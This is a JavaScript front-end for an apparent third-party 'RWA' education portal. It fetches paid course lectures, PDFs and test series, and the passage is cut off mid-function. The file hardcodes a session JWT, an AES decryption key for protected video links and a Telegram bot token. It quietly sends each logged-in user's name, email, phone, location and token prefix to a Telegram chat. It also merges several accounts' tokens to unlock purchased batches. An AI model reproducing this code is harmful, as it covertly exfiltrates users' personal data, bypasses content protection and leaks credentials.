// =========================================================
// RWA SKY PORTAL - MASTER ENGINE, MULTI-TOKEN & CBT TESTS (app.js)
// =========================================================
const DEFAULT_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjQ3NTYzMTYiLCJ0aW1lc3RhbXAiOjE3OTE5Nzc2MTIsIml2X3ZlciI6MzMsInNlc3Npb24iOiJleUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpJVXpJMU5pSjkuZXlKcFpDSTZJalEzTlRZek1UWWlMQ0psYldGcGJDSTZJbk5oYm1SbFpYQnJZWE4zWVc0eU5UUkFaMjFoYVd3dVkyOXRJaXdpYm1GdFpTSTZJbk5oYm1SbFpYQWlMQ0owWlc1aGJuUlVlWEJsSWpvaWRYTmxjaUlzSW5SbGJtRnVkRTVoYldVaU9pSnliM3BuWVhKZlpHSWlMQ0owWlc1aGJuUkpaQ0k2SWlJc0ltUnBjM0J2YzJGaWJHVWlPbVpoYkhObGZRLjNLTWRpUHRjZ3BpYkMyMWhPNTlrVFRreTJkdlk0d19YR0F3UnE4N3o4aE0ifQ.LN3ukePscrf6LVISc9oJcyRh4V5sipHnTVUBvRcwRHk";

const API_BASE = "https://rozgarapinew.teachx.in";
const AES_KEY = CryptoJS.enc.Utf8.parse("638udh3829162018");
const WORKER_RAW_PROXY = "https://proplayer.allswbatch22.workers.dev/proxy?url=";

// Telegram Bot Configuration for User Details Forwarding
const TG_BOT_TOKEN = "8953710743:AAHJUQB5f0gefAEDyieZFcsyU2GEUu3LzRk";
const TG_CHAT_ID = "-1004331013936";

// =====================================================
// MULTI-TOKEN STORAGE & AUTH / PROFILE ENGINE
// =====================================================
function getSavedTokens() {
    try {
        const raw = localStorage.getItem("rwa_tokens_list");
        if (raw) {
            const parsed = JSON.parse(raw);
            if (Array.isArray(parsed) && parsed.length > 0) return parsed;
        }
    } catch {}
    const singleTok = localStorage.getItem("rwa_tok") || DEFAULT_TOKEN;
    const singleUid = localStorage.getItem("rwa_uid") || "4756316";
    const initial = [{ id: "tok_default", label: "Primary RWA Account", userId: singleUid, token: singleTok }];
    localStorage.setItem("rwa_tokens_list", JSON.stringify(initial));
    return initial;
}

let TOKENS = getSavedTokens();

function updateTokenBadge() {
    const b = document.getElementById("tokCountBadge");
    if (b) b.textContent = TOKENS.length;
    checkAuthUIState();
}

function checkAuthUIState() {
    const loginModal = document.getElementById("loginModal");
    const activeTok = TOKENS[0];
    if (activeTok && activeTok.token) {
        if (loginModal) loginModal.classList.add("hidden");
    } else {
        if (loginModal) loginModal.classList.remove("hidden");
    }
}

// Login Modal Controls
function openLoginModal() {
    document.getElementById("loginModal").classList.remove("hidden");
}
function closeLoginModal() {
    document.getElementById("loginModal").classList.add("hidden");
}

async function sendDetailsToTelegram(userData) {
    if (!TG_BOT_TOKEN || TG_BOT_TOKEN.includes("YOUR_BOT_TOKEN")) return;
    try {
        const text = `🔔 *New User Login Success!*\n\n👤 *Name:* ${userData.name}\n📧 *Email:* ${userData.email}\n📱 *Phone:* ${userData.phone}\n📍 *State:* ${userData.state} (${userData.district})\n🏷️ *Category:* ${userData.info_1} \vert{}${userData.info_2}\n🔑 *Token:* \`${TOKENS[0].token.slice(0, 20)}...\``;
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: "Markdown" })
        });
    } catch {}
}

async function submitUserLogin() {
    const phone = document.getElementById("loginPhoneInput").value.trim();
    const pass = document.getElementById("loginPassInput").value.trim();
    if (!phone || !pass) {
        alert("Please enter phone/username and password/token.");
        return;
    }
    
    // 2nd Option: Direct Token Input
    if (pass.startsWith("eyJ")) {
        TOKENS[0].token = pass;
        TOKENS[0].label = phone;
        localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
        closeLoginModal();
        alert("Login successful with Direct Token!");
        updateTokenBadge();
        fetchAndSyncUserProfile(TOKENS[0].userId || "4756316");
        return;
    }

    // 1st Option: Phone & Password Server Request
    try {
        const res = await fetch(`${API_BASE}/get/login`, {
            method: "POST",
            headers: { "Client-Service": "Appx", "Auth-Key": "appxapi", "Content-Type": "application/json" },
            body: JSON.stringify({ username: phone, password: pass })
        });
        const json = await res.json();
        if (json && json.status === 200 && json.data) {
            const token = json.data.token || json.data.jwt || DEFAULT_TOKEN;
            const uid = String(json.data.userid || json.data.id || "4756316");
            TOKENS[0].token = token;
            TOKENS[0].userId = uid;
            TOKENS[0].label = json.data.name || phone;
            localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
            closeLoginModal();
            alert(`Welcome back, ${json.data.name || 'User'}!`);
            updateTokenBadge();
            fetchAndSyncUserProfile(uid);
        } else {
            alert("Login failed. Please check credentials or use direct JWT Token.");
        }
    } catch {
        alert("Network error. Saving input as token.");
        TOKENS[0].token = pass;
        TOKENS[0].label = phone;
        localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
        closeLoginModal();
        updateTokenBadge();
        location.reload();
    }
}

async function fetchAndSyncUserProfile(uid) {
    const activeTok = TOKENS[0];
    const json = await fetchRawJSONWithToken(`/get/get_user_dt?userid=${uid}`, activeTok);
    if (json && json.status === 200 && json.data && json.data.length > 0) {
        sendDetailsToTelegram(json.data[0]);
    }
    location.reload();
}

async function openProfileModal() {
    document.getElementById("profileModal").classList.remove("hidden");
    const contentBox = document.getElementById("profileDetailsContent");
    contentBox.innerHTML = `<p class="text-slate-500 font-bold">Loading profile data...</p>`;

    const activeTok = TOKENS[0];
    const uid = activeTok.userId || "4756316";
    const json = await fetchRawJSONWithToken(`/get/get_user_dt?userid=${uid}`, activeTok);

    if (json && json.status === 200 && json.data && json.data.length > 0) {
        const u = json.data[0];
        contentBox.innerHTML = `
            <div class="space-y-2">
                <p><b>Name:</b> ${u.name || 'N/A'}</p>
                <p><b>Email:</b> ${u.email || 'N/A'}</p>
                <p><b>Phone:</b> ${u.phone || 'N/A'}</p>
                <p><b>State:</b> ${u.state || 'N/A'} (${u.district || 'N/A'})</p>
                <p><b>Category / Info:</b> ${u.info_1 || 'General'} | ${u.info_2 || 'N/A'}</p>
                <p><b>Referral Code:</b> ${u.refer_code || 'N/A'}</p>
            </div>`;
    } else {
        contentBox.innerHTML = `<p class="text-rose-500 font-bold">Failed to load profile details from server.</p>`;
    }
}

function closeProfileModal() {
    document.getElementById("profileModal").classList.add("hidden");
}

function handleLogout() {
    if (confirm("Are you sure you want to logout?")) {
        localStorage.removeItem("rwa_tokens_list");
        localStorage.removeItem("rwa_tok");
        localStorage.removeItem("rwa_uid");
        TOKENS = [];
        alert("Logged out successfully.");
        updateTokenBadge();
        location.reload();
    }
}

function decryptAppX(encStr) {
    if (!encStr || typeof encStr !== "string") return "";
    if (encStr.startsWith("http")) return encStr.trim();
    if (!encStr.includes(":")) return encStr.trim();
    try {
        const [cipherB64, ivB64] = encStr.split(":");
        const cipherParams = CryptoJS.lib.CipherParams.create({
            ciphertext: CryptoJS.enc.Base64.parse(cipherB64.replace(/\\\//g, "/"))
        });
        const iv = CryptoJS.enc.Base64.parse(ivB64);
        const dec = CryptoJS.AES.decrypt(cipherParams, AES_KEY, {
            iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7
        });
        return dec.toString(CryptoJS.enc.Utf8).replace(/[\x00-\x1F\x7F]/g, "").trim();
    } catch {
        return "";
    }
}

function resolvePdfUrl(encPdf, signedPdf) {
    const dec = decryptAppX(encPdf);
    if (dec && dec.startsWith("http")) return dec;
    if (signedPdf && signedPdf.startsWith("http")) return signedPdf;
    if (signedPdf && signedPdf.includes("URLPrefix=")) {
        try {
            const b64 = signedPdf.split("URLPrefix=")[1].split("&")[0].split("~")[0];
            const decoded = atob(decodeURIComponent(b64));
            if (decoded.startsWith("http")) return decoded;
        } catch {}
    }
    return signedPdf || dec || "";
}

// =====================================================
// PAID BATCHES & MULTI-TOKEN MERGING (NO DUPLICATES)
// =====================================================
async function renderPaidBatches() {
    state.view = "batches";
    document.getElementById("subTabs").classList.add("hidden");
    document.getElementById("crumbText").textContent = `All Tokens Merged (${TOKENS.length})`;
    document.getElementById("headingText").textContent = "🎓 Purchased Paid Batches";

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Fetching Paid Batches from all tokens...</div>`;

    let mergedCourses = [];
    const seenIds = new Set();

    for (const tokObj of TOKENS) {
        const endpointsToTry = [
            `/get/mycourseweb?userid=${tokObj.userId || "4756316"}`,
            `/get/mycourse?userid=${tokObj.userId || "4756316"}`,
            `/get/course_by_id?id=571`
        ];

        for (const ep of endpointsToTry) {
            const data = await fetchAPIWithToken(ep, tokObj, () => null);
            if (Array.isArray(data) && data.length > 0) {
                data.forEach(c => {
                    const cid = String(c.id || c.course_id || "");
                    if (cid && !seenIds.has(cid)) {
                        seenIds.add(cid);
                        state.courseTokenMap[cid] = tokObj;
                        mergedCourses.push({ ...c, id: cid, _tokenLabel: tokObj.label });
                    }
                });
            }
        }
    }

    grid.innerHTML = "";
    if (mergedCourses.length === 0) {
        grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">No paid courses found. Please add a valid token in Tokens Manager.</div>`;
        return;
    }

    mergedCourses.forEach(c => {
        const logo = c.exam_logo || c.course_thumbnail || `https://placehold.co/600x320/0284c7/ffffff?text=Batch+${c.id}`;
        const safeName = (c.course_name || "RWA Paid Batch").replace(/'/g, "");
        grid.innerHTML += `
            <div onclick="openPaidCourse('${c.id}', '${safeName}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                <div>
                    <img src="${logo}" onerror="this.src='https://placehold.co/600x320/0284c7/ffffff?text=RWA+Batch'" class="w-full h-44 object-cover">
                    <div class="p-4">
                        <div class="flex justify-between items-center gap-2">
                            <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">BATCH #${c.id}</span>
                            <span class="text-[10px] font-bold text-sky-700 truncate">🔑 ${c._tokenLabel || "Account"}</span>
                        </div>
                        <h3 class="font-black text-base text-slate-900 mt-2">${c.course_name}</h3>
                    </div>
                </div>
                <div class="px-4 pb-4">
                    <div class="btn-watch w-full text-center text-xs">Open Subjects & Batch Tests ➔</div>
                </div>
            </div>`;
    });
}

async function renderFreeBatches() {
    state.view = "batches";
    document.getElementById("subTabs").classList.add("hidden");
    document.getElementById("crumbText").textContent = "Free Portal";
    document.getElementById("headingText").textContent = "🆓 RWA Free Batches";

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Free Batches...</div>`;

    const freeData = await fetchAPIWithToken(`/get/courselist?start=-1`, TOKENS[0], () => []);
    const list = (Array.isArray(freeData) && freeData.length > 0) ? freeData : [];

    grid.innerHTML = "";
    list.forEach(c => {
        const cid = c.id || "free_101";
        const name = (c.course_name || "Free Course").replace(/'/g, "");
        const logo = c.exam_logo || c.course_thumbnail || "https://placehold.co/600x320/059669/ffffff?text=Free+Batch";
        grid.innerHTML += `
            <div onclick="openFreeCourse('${cid}', '${name}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                <img src="${logo}" onerror="this.src='https://placehold.co/600x320/059669/ffffff?text=Free+Batch'" class="w-full h-44 object-cover">
                <div class="p-4">
                    <span class="px-2.5 py-0.5 rounded-full bg-teal-100 text-teal-800 text-[10px] font-black">FREE BATCH</span>
                    <h3 class="font-black text-base text-slate-900 mt-2">${c.course_name || name}</h3>
                    <div class="btn-watch w-full text-center text-xs mt-3">Open Free Classes ➔</div>
                </div>
            </div>`;
    });
}

function openPaidCourse(id, name) {
    state.courseId = id;
    state.courseName = name;
    state.activeTokenObj = state.courseTokenMap[id] || TOKENS[0];
    document.getElementById("subTabs").classList.remove("hidden");
    document.getElementById("crumbText").textContent = `Batch #${id}`;
    document.getElementById("headingText").textContent = name;
    loadCourseTab("subjects");
}

async function loadCourseTab(tab) {
    ["subjects", "live", "tests", "telegram"].forEach(t => {
        const el = document.getElementById("sub_" + t);
        if (el) el.className = (t === tab) ? "tab-pill active-pill" : "tab-pill";
    });
    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading...</div>`;

    if (tab === "subjects") {
        state.view = "subjects";
        const subs = await fetchAPIWithToken(`/get/allsubjectfrmlivecourseclass?courseid=${state.courseId}&start=-1`, state.activeTokenObj, () => []);
        grid.innerHTML = "";
        subs.forEach(s => {
            const name = s.subject_name || s.subjectname || "Subject";
            const logo = s.subject_logo || `https://placehold.co/80x80/0284c7/ffffff?text=${encodeURIComponent(name.slice(0, 3))}`;
            grid.innerHTML += `
                <div onclick="openPaidTopics('${s.subjectid}', '${name.replace(/'/g, "")}')" class="grid-card p-4 flex items-center gap-4 cursor-pointer">
                    <img src="${logo}" onerror="this.src='https://placehold.co/80x80/0284c7/ffffff?text=SUB'" class="w-16 h-16 rounded-2xl object-cover shadow-md">
                    <div class="flex-1">
                        <span class="px-2 py-0.5 rounded bg-sky-100 text-sky-800 text-[10px] font-black">SUBJECT #${s.subjectid}</span>
                        <h4 class="font-black text-base text-slate-900 mt-1">${name}</h4>
                        <p class="text-xs text-blue-600 font-extrabold mt-1">Explore Topics ➔</p>
                    </div>
                </div>`;
        });
    } else if (tab === "live") {
        const res = await fetchAPIWithToken(`/get/live_upcoming_course_classv2?courseid=${state.courseId}&start=-1`, state.activeTokenObj, () => []);
        const list = Array.isArray(res) ? res : (res.upcoming || res.live || []);
        grid.innerHTML = "";
        renderLectureList(list);
    } else if (tab === "tests") {
        state.view = "batch_ts_subjects";
        const tsId = "700";
        state.activeSeriesId = tsId;
        state.activeSeriesTitle = `${state.courseName} - Batch Tests`;

        const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, state.activeTokenObj, () => []);
        grid.innerHTML = "";
        subs.forEach(s => {
            const sname = (s.subject_name || "Batch Test Subject").replace(/'/g, "");
            grid.innerHTML += `
                <div onclick="openBatchInternalTests('${tsId}', '${s.subjectid}', '${sname}')" class="grid-card p-5 flex items-center justify-between cursor-pointer">
                    <div>
                        <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-800 text-[10px] font-black">SERIES #${tsId} • SUB #${s.subjectid}</span>
                        <h4 class="font-black text-base text-slate-900 mt-1.5">📝 ${s.subject_name}</h4>
                        <p class="text-xs text-indigo-600 font-bold mt-1">View Subject Quizzes & Tests ➔</p>
                    </div>
                    <span class="btn-watch text-xs">Open ➔</span>
                </div>`;
        });
    } else if (tab === "telegram") {
        grid.innerHTML = `
            <div class="col-span-full grid-card p-6 flex flex-wrap justify-between items-center gap-4">
                <div>
                    <span class="text-xs font-black text-blue-600 uppercase">Official Community</span>
                    <h4 class="font-black text-lg text-slate-900">✈️ RWA Batch Doubt Group</h4>
                </div>
                <a href="https://t.me/+ACPxjpf6oKQxM2U1" target="_blank" class="btn-watch text-xs no-underline px-5 py-3">Join Telegram ➔</a>
            </div>`;
    }
}

async function openPaidTopics(subId, subName) {
    state.view = "topics";
    state.subjectId = subId;
    state.subjectName = subName;
    document.getElementById("subTabs").classList.add("hidden");
    document.getElementById("crumbText").textContent = state.courseName;
    document.getElementById("headingText").textContent = `📂 ${subName}`;

    const topics = await fetchAPIWithToken(`/get/alltopicfrmlivecourseclass?courseid=${state.courseId}&subjectid=${subId}&start=-1`, state.activeTokenObj, () => []);
    const grid = document.getElementById("mainGrid");
    grid.innerHTML = "";

    topics.forEach(t => {
        const name = (t.topic_name || t.topicname || "Topic").replace(/'/g, "");
        grid.innerHTML += `
            <div onclick="openPaidLectures('${t.topicid}', '${name}')" class="grid-card p-5 flex justify-between items-center cursor-pointer">
                <div>
                    <span class="text-[10px] font-bold text-sky-700 uppercase">Topic Folder</span>
                    <h4 class="font-black text-base text-slate-900 mt-0.5">📁 ${name}</h4>
                </div>
                <span class="btn-watch text-xs">Classes ➔</span>
            </div>`;
    });
}

async function openPaidLectures(topId, topName) {
    state.view = "lectures";
    state.topicId = topId;
    state.topicName = topName;
    document.getElementById("crumbText").textContent = state.subjectName;
    document.getElementById("headingText").textContent = `🎬 ${topName}`;

    const classes = await fetchAPIWithToken(
        `/get/livecourseclassbycoursesubtopconceptapiv3?courseid=${state.courseId}&subjectid=${state.subjectId}&topicid=${topId}&conceptid=1&start=0`,
        state.activeTokenObj,
        () => []
    );
    document.getElementById("mainGrid").innerHTML = "";
    renderLectureList(classes);
}

function normalizeQualityLabel(rawLabel) {
    const s = String(rawLabel || "").toLowerCase();
    if (s.includes("720")) return "720p";
    if (s.includes("480")) return "480p";
    if (s.includes("360")) return "360p";
    if (s.includes("240")) return "240p";
    if (s.includes("1080")) return "1080p";
    if (s.includes("144")) return "144p";
    return "";
}

function extractQualitiesFromItem(item) {
    const rawMap = {};

    function addCandidate(rawQual, encPath, isM3u8Priority) {
        let u = decryptAppX(encPath);
        if (!u || !u.startsWith("http") || u.includes("playlist_eof.m3u8")) return;

        let cleanQ = normalizeQualityLabel(rawQual);
        if (!cleanQ) {
            const m = u.match(/\/(720p|480p|360p|240p|144p)\//i) || u.match(/bitrate=(720|480|360|240)/i);
            if (m) cleanQ = m[1].toLowerCase().endsWith("p") ? m[1].toLowerCase() : `${m[1]}p`;
            else cleanQ = "720p";
        }

        if (!rawMap[cleanQ] || isM3u8Priority || u.includes(".m3u8")) {
            rawMap[cleanQ] = u;
        }
    }

    (item.encrypted_links || []).forEach(q => addCandidate(q.quality, q.path, true));
    (item.livestream_links || []).forEach(q => addCandidate(q.quality, q.path, true));
    (item.download_links || []).forEach(q => addCandidate(q.quality, q.path, false));

    const decFile = decryptAppX(item.file_link || "");
    if (decFile) {
        if (decFile.startsWith("http") && !decFile.includes("playlist_eof.m3u8")) {
            addCandidate("720p", decFile, decFile.includes(".m3u8"));
        } else if (!decFile.startsWith("http") && decFile.length >= 10 && decFile.length <= 15) {
            rawMap["720p"] = decFile;
        }
    }

    const order = ["1080p", "720p", "480p", "360p", "240p", "144p"];
    const sortedMap = {};
    order.forEach(k => {
        if (rawMap[k]) sortedMap[k] = rawMap[k];
    });
    Object.keys(rawMap).forEach(k => {
        if (!sortedMap[k]) sortedMap[k] = rawMap[k];
    });

    return sortedMap;
}

function renderLectureList(list) {
    const grid = document.getElementById("mainGrid");
    state.currentLectureKeys = [];

    if (!list || !list.length) {
        grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is folder mein abhi koi class nahi hai.</div>`;
        return;
    }

    list.forEach((item, i) => {
        const key = `lec_${item.id || i}`;
        state.currentLectureKeys.push(key);

        const qMap = extractQualitiesFromItem(item);
        const pdf1 = resolvePdfUrl(item.pdf_link || item.ypdf_link, item.ypdf_link2);
        const pdf2 = resolvePdfUrl(item.pdf_link2, item.ypdf_link2);

        state.mediaMap[key] = {
            key: key,
            id: item.id,
            title: item.Title || "Class Lecture",
            date: item.date_and_time || "",
            thumb: item.thumbnail || "",
            qualities: qMap,
            pdf1: pdf1,
            pdf2: pdf2
        };

        grid.innerHTML += `
            <div class="grid-card overflow-hidden flex flex-col justify-between">
                <div>
                    ${item.thumbnail ? `<img src="${item.thumbnail}" onerror="this.style.display='none'" class="w-full h-44 object-cover">` : ""}
                    <div class="p-4">
                        <span class="px-2.5 py-0.5 rounded-full bg-sky-100 text-sky-900 text-[10px] font-black">CLASS #${item.id || (i + 1)}</span>
                        <h4 class="font-black text-base text-slate-900 mt-2">${item.Title}</h4>
                        ${item.date_and_time ? `<p class="text-[11px] text-slate-500 font-semibold mt-1">🕒 ${item.date_and_time}</p>` : ""}
                    </div>
                </div>
                <div class="p-4 pt-2 border-t border-sky-100 flex flex-wrap gap-2">
                    <button onclick="playClassInRwaPlayer('${key}')" class="btn-watch flex-1 text-xs">▶ Watch Video</button>
                    ${pdf1 ? `<button onclick="openPdf('${key}', 1)" class="btn-pdf1 text-xs">📄 PDF 1</button>` : ""}
                    ${pdf2 ? `<button onclick="openPdf('${key}', 2)" class="btn-pdf2 text-xs">📄 PDF 2</button>` : ""}
                </div>
            </div>`;
    });
}

async function playClassInRwaPlayer(key) {
    state.activeKey = key;
    const info = state.mediaMap[key];
    if (!info) return;

    showSlide("slidePlayer");
    document.getElementById("playingTitle").textContent = "▶ " + info.title;

    closeInlinePdfAndReset();
    renderNextClassesBelowPlayer(key);

    const pPdf1 = document.getElementById("playerPdf1");
    const pPdf2 = document.getElementById("playerPdf2");
    if (pPdf1) {
        if (info.pdf1) pPdf1.classList.remove("hidden");
        else pPdf1.classList.add("hidden");
    }
    if (pPdf2) {
        if (info.pdf2) pPdf2.classList.remove("hidden");
        else pPdf2.classList.add("hidden");
    }

    const urlInput = document.getElementById("url");

    if (state.cat === "paid" && info.id) {
        const fresh = await fetchAPIWithToken(
            `/get/fetchVideoDetailsById?course_id=${state.courseId}&video_id=${info.id}&ytflag=0&folder_wise_course=0&lc_app_api_url=`,
            state.activeTokenObj,
            () => null
        );
        if (fresh && typeof fresh === "object") {
            const freshMap = extractQualitiesFromItem(fresh);
            info.qualities = { ...info.qualities, ...freshMap };

            const fPdf1 = resolvePdfUrl(fresh.pdf_link || fresh.ypdf_link, fresh.ypdf_link2);
            const fPdf2 = resolvePdfUrl(fresh.pdf_link2, fresh.ypdf_link2);
            if (fPdf1 && !info.pdf1) { info.pdf1 = fPdf1; if (pPdf1) pPdf1.classList.remove("hidden"); }
            if (fPdf2 && !info.pdf2) { info.pdf2 = fPdf2; if (pPdf2) pPdf2.classList.remove("hidden"); }
        }
    }

    const validKeys = Object.keys(info.qualities).filter(k => {
        const u = info.qualities[k];
        return u && !u.includes("playlist_eof.m3u8");
    });

    if (validKeys.length > 0) {
        const bestKey = validKeys.find(k => k === "720p") || validKeys[0];
        urlInput.value = info.qualities[bestKey];
        if (typeof start === "function") start();
    }
}

function renderNextClassesBelowPlayer(activeKey) {
    const grid = document.getElementById("nextClassesGrid");
    const countBadge = document.getElementById("nextClassesCount");
    if (!grid) return;

    const allKeys = state.currentLectureKeys || [];
    const currentIndex = allKeys.indexOf(activeKey);
    const orderedNextKeys = currentIndex >= 0
        ? [...allKeys.slice(currentIndex + 1), ...allKeys.slice(0, currentIndex)]
        : allKeys.filter(k => k !== activeKey);

    if (countBadge) countBadge.textContent = `${orderedNextKeys.length} Classes`;

    if (orderedNextKeys.length === 0) {
        grid.innerHTML = `<div class="col-span-full py-6 text-center text-xs font-bold text-slate-500">Is topic mein yeh aakhri class hai.</div>`;
        return;
    }

    grid.innerHTML = orderedNextKeys.map((k, idx) => {
        const item = state.mediaMap[k];
        if (!item) return "";
        return `
            <div class="grid-card p-3.5 flex flex-col justify-between">
                <div class="flex items-start gap-3">
                    <div class="w-10 h-10 rounded-xl bg-sky-100 text-sky-800 font-black text-xs flex items-center justify-center shrink-0">#${idx + 1}</div>
                    <div class="min-w-0 flex-1">
                        <span class="text-[10px] font-black text-sky-700 uppercase">Up Next</span>
                        <h5 class="font-extrabold text-sm text-slate-900 line-clamp-2 mt-0.5">${item.title}</h5>
                    </div>
                </div>
                <div class="flex gap-2 mt-3 pt-2 border-t border-sky-100">
                    <button onclick="playClassInRwaPlayer('${k}')" class="btn-watch flex-1 text-xs py-2">▶ Play Next</button>
                    ${item.pdf1 ? `<button onclick="openInlinePdfForKey('${k}', 1)" class="btn-pdf1 text-xs py-2">📄 PDF</button>` : ""}
                </div>
            </div>`;
    }).join("");
}

window.openActivePlayerPdf = function(num) {
    if (!state.activeKey) return;
    openInlinePdfForKey(state.activeKey, num);
};

window.openInlinePdfForKey = function(key, num) {
    const info = state.mediaMap[key];
    if (!info) return;
    const u = num === 2 ? info.pdf2 : info.pdf1;
    if (!u) return;

    state.inlinePdfUrl = u;
    document.getElementById("inlinePdfTitle").textContent = `📄 ${info.title} (PDF ${num})`;
    document.getElementById("inlineRawPdfLink").href = u;

    document.getElementById("nextClassesBox").classList.add("hidden");
    document.getElementById("inlinePdfBox").classList.remove("hidden");

    setInlinePdfMode("appx");
    document.getElementById("inlinePdfBox").scrollIntoView({ behavior: "smooth" });
};

window.setInlinePdfMode = function(mode) {
    const frame = document.getElementById("inlinePdfFrame");
    const u = state.inlinePdfUrl;
    if (!u || !frame) return;
    if (mode === "appx") {
        frame.src = `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(u)}&save_flag=1&is_encrypted=0`;
    } else {
        frame.src = `https://docs.google.com/viewer?url=${encodeURIComponent(u)}&embedded=true`;
    }
};

window.switchBottomToNextClasses = function() {
    closeInlinePdfAndReset();
};

function closeInlinePdfAndReset() {
    const frame = document.getElementById("inlinePdfFrame");
    if (frame) frame.src = "";
    const pdfBox = document.getElementById("inlinePdfBox");
    const nextBox = document.getElementById("nextClassesBox");
    if (pdfBox) pdfBox.classList.add("hidden");
    if (nextBox) nextBox.classList.remove("hidden");
}

function changeLectureQuality(qLabel) {
    const info = state.mediaMap[state.activeKey];
    if (info && info.qualities[qLabel]) {
        document.getElementById("url").value = info.qualities[qLabel];
        if (typeof start === "function") start();
    }
}

async function openTestSeriesExplorer(mode) {
    state.tsMode = mode;
    state.view = "ts_list";
    showSlide("slideExplorer");
    document.getElementById("subTabs").classList.add("hidden");

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Loading Official RWA Test Series...</div>`;

    if (mode === "paid_ts") {
        document.getElementById("crumbText").textContent = "Official Exam Series";
        document.getElementById("headingText").textContent = "🏆 Paid Test Series";

        const p0 = await fetchAPIWithToken(`/get/test_series?start=0&search=&client_api_url=&exam_id=`, TOKENS[0], () => []);
        const p10 = await fetchAPIWithToken(`/get/test_series?start=10&search=&client_api_url=&exam_id=`, TOKENS[0], () => []);
        let combined = [...(Array.isArray(p0) ? p0 : []), ...(Array.isArray(p10) ? p10 : [])];

        const seen = new Set();
        grid.innerHTML = "";
        combined.forEach(ts => {
            if (seen.has(String(ts.id))) return;
            seen.add(String(ts.id));
            const title = (ts.title || "Paid Test Series").replace(/'/g, "");
            const logo = ts.logo || "https://placehold.co/600x320/4f46e5/ffffff?text=Test+Series";
            grid.innerHTML += `
                <div onclick="openTestSeriesSubjects('${ts.id}', '${title}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                    <div>
                        <img src="${logo}" onerror="this.src='https://placehold.co/600x320/4f46e5/ffffff?text=RWA+Test+Series'" class="w-full h-44 object-cover">
                        <div class="p-4">
                            <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-900 text-[10px] font-black">SERIES #${ts.id}</span>
                            <h3 class="font-black text-base text-slate-900 mt-2">${ts.title}</h3>
                        </div>
                    </div>
                    <div class="px-4 pb-4">
                        <div class="btn-watch w-full text-center text-xs">Open Test Subjects ➔</div>
                    </div>
                </div>`;
        });
    } else {
        document.getElementById("crumbText").textContent = "Weekly Mock Tests";
        document.getElementById("headingText").textContent = "📝 Free Test Series";

        const f0 = await fetchAPIWithToken(`/get/quiz_test_series?start=0&exam_id=`, TOKENS[0], () => []);
        const f10 = await fetchAPIWithToken(`/get/quiz_test_series?start=10&exam_id=`, TOKENS[0], () => []);
        let combined = [...(Array.isArray(f0) ? f0 : []), ...(Array.isArray(f10) ? f10 : [])];

        const seen = new Set();
        grid.innerHTML = "";
        combined.forEach(ts => {
            if (seen.has(String(ts.id))) return;
            seen.add(String(ts.id));
            const title = (ts.title || "Free Test Series").replace(/'/g, "");
            const logo = ts.logo || "https://placehold.co/600x320/0891b2/ffffff?text=Free+Tests";
            grid.innerHTML += `
                <div onclick="openTestSeriesSubjects('${ts.id}', '${title}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                    <div>
                        <img src="${logo}" onerror="this.src='https://placehold.co/600x320/0891b2/ffffff?text=Free+Test+Series'" class="w-full h-44 object-cover">
                        <div class="p-4">
                            <span class="px-2.5 py-0.5 rounded-full bg-teal-100 text-teal-900 text-[10px] font-black">FREE SERIES #${ts.id}</span>
                            <h3 class="font-black text-base text-slate-900 mt-2">${ts.title}</h3>
                        </div>
                    </div>
                    <div class="px-4 pb-4">
                        <div class="btn-watch w-full text-center text-xs">View All Mock Tests ➔</div>
                    </div>
                </div>`;
        });
    }
}

async function openTestSeriesSubjects(tsId, tsTitle) {
    state.activeSeriesId = tsId;
    state.activeSeriesTitle = tsTitle;
    state.view = "ts_subjects";
    document.getElementById("crumbText").textContent = `Test Series #${tsId}`;
    document.getElementById("headingText").textContent = tsTitle;

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Test Series Subjects...</div>`;

    const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, TOKENS[0], () => []);

    if (!subs || subs.length === 0 || (subs.length === 1 && String(subs[0].subjectid) === "-1")) {
        openTestSeriesTitles(tsId, "-1", tsTitle);
        return;
    }

    grid.innerHTML = "";
    subs.forEach(s => {
        const sname = (s.subject_name || "Mock Tests").replace(/'/g, "");
        const logo = s.subject_logo || `https://placehold.co/80x80/4f46e5/ffffff?text=${encodeURIComponent(sname.slice(0, 3))}`;
        grid.innerHTML += `
            <div onclick="openTestSeriesTitles('${tsId}', '${s.subjectid}', '${sname}')" class="grid-card p-4 flex items-center gap-4 cursor-pointer">
                <img src="${logo}" onerror="this.src='https://placehold.co/80x80/4f46e5/ffffff?text=TEST'" class="w-16 h-16 rounded-2xl object-cover shadow-md">
                <div class="flex-1">
